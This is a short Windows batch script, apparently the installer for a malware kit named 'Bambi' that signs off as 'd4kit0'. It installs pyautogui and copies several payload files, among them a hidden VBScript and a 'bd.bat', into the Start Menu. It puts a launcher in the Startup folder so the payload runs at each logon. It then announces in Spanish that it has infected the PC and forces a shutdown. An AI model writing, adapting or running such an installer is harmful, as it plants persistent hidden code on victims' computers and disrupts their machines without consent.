@echo OFF

C:

python -m pip install pyautogui

cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu"
md Bambi
cd Bambi

xcopy %UserProfile%\Documents\Bamby\disable.pyw "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\installer.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\bd.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\hidden.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\ejecuter.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /O /X /E /H /K
cls
echo "[+] PyAutoGUI Instalado Correctamente."
echo "[*] Copiando archivos..."
echo "[+] Archivos copiados con exito."
echo "[+] Bambi se ha instalado correctamente..."
echo "Un placer infectar tu pc... Atte: d4kit0.

timeout /nobreak 5
shutdown /f /s